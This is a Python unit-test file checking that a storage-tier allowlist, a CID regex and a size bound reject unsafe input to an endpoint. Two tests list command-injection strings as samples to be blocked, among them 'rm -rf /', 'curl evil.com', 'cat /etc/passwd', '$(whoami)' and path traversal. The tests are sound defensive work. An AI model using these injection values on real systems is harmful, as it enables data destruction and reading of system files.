"""Unit tests for sovereignty endpoint input sanitization.

Verifies that user-controlled values (tier, cid, max_size) are validated
before being interpolated into command strings passed to agent.process_input().
"""
import inspect
import re
import pytest

from kestrel_sovereign.endpoints.sovereignty import ALLOWED_TIERS, CID_PATTERN, preview_sovereignty_file
from kestrel_sovereign.kestrel_config.constants import MAX_SOVEREIGNTY_PREVIEW_SIZE


class TestTierValidation:
    """Tests for tier allowlist validation."""

    def test_allowed_tiers_contains_expected_values(self):
        """Allowlist includes all valid storage tiers."""
        assert "local" in ALLOWED_TIERS
        assert "ipfs" in ALLOWED_TIERS
        assert "filecoin" in ALLOWED_TIERS

    def test_allowed_tiers_rejects_unknown(self):
        """Unknown tiers are not in the allowlist."""
        assert "arweave" not in ALLOWED_TIERS
        assert "s3" not in ALLOWED_TIERS
        assert "" not in ALLOWED_TIERS

    def test_tier_injection_blocked(self):
        """Command injection via tier parameter is blocked."""
        malicious_tiers = [
            "ipfs; rm -rf /",
            "ipfs && curl evil.com",
            "ipfs\n!delete-all",
            "local --extra-flag",
            "'; DROP TABLE users; --",
            "ipfs$(whoami)",
        ]
        for malicious in malicious_tiers:
            assert malicious not in ALLOWED_TIERS, f"Should block: {malicious}"


class TestCIDValidation:
    """Tests for CID format validation."""

    def test_valid_cidv0(self):
        """CIDv0 (Qm...) format passes validation."""
        assert CID_PATTERN.match("QmYwAPJzv5CZsnA625s3Xf2nemtYgPpHdWEz79ojWnPbdG")

    def test_valid_cidv1(self):
        """CIDv1 (bafy...) format passes validation."""
        assert CID_PATTERN.match("bafybeigdyrzt5sfp7udm7hu76uh7y26nf3efuylqabf3oclgtqy55fbzdi")

    def test_rejects_empty_string(self):
        """Empty string fails CID validation."""
        assert not CID_PATTERN.match("")

    def test_rejects_spaces(self):
        """CID with spaces is rejected."""
        assert not CID_PATTERN.match("Qm abc123")

    def test_rejects_shell_injection(self):
        """Shell metacharacters in CID are rejected."""
        malicious_cids = [
            "Qmabc; rm -rf /",
            "Qmabc && curl evil.com",
            "Qmabc\n!delete-all",
            "$(whoami)",
            "Qmabc|cat /etc/passwd",
            "Qmabc`id`",
            "../../../etc/passwd",
            "Qmabc --flag=value",
        ]
        for malicious in malicious_cids:
            assert not CID_PATTERN.match(malicious), f"Should reject: {malicious}"

    def test_accepts_alphanumeric_only(self):
        """Only purely alphanumeric strings pass."""
        assert CID_PATTERN.match("abc123DEF456")
        assert CID_PATTERN.match("QmValidCID12345")
        assert not CID_PATTERN.match("abc-123")
        assert not CID_PATTERN.match("abc_123")
        assert not CID_PATTERN.match("abc/123")


class TestMaxSizeBounded:
    """Tests that max_size query parameter is bounded."""

    def _get_query(self):
        """Extract the Query object from preview_sovereignty_file's max_size param."""
        sig = inspect.signature(preview_sovereignty_file)
        return sig.parameters["max_size"].default

    def _find_metadata(self, query, cls_name):
        """Find a metadata constraint by class name (e.g. 'Le', 'Gt')."""
        for m in query.metadata:
            if type(m).__name__ == cls_name:
                return m
        return None

    def test_max_size_has_upper_bound_via_query(self):
        """The max_size parameter uses FastAPI Query with le constraint."""
        query = self._get_query()
        le_constraint = self._find_metadata(query, "Le")
        assert le_constraint is not None, "max_size should use Query() with le constraint"
        assert le_constraint.le == MAX_SOVEREIGNTY_PREVIEW_SIZE

    def test_max_size_rejects_zero_or_negative(self):
        """The max_size parameter must be greater than 0."""
        query = self._get_query()
        gt_constraint = self._find_metadata(query, "Gt")
        assert gt_constraint is not None, "max_size should use Query() with gt constraint"
        assert gt_constraint.gt == 0

    def test_max_size_default_value(self):
        """The max_size parameter defaults to MAX_SOVEREIGNTY_PREVIEW_SIZE."""
        query = self._get_query()
        assert query.default == MAX_SOVEREIGNTY_PREVIEW_SIZE
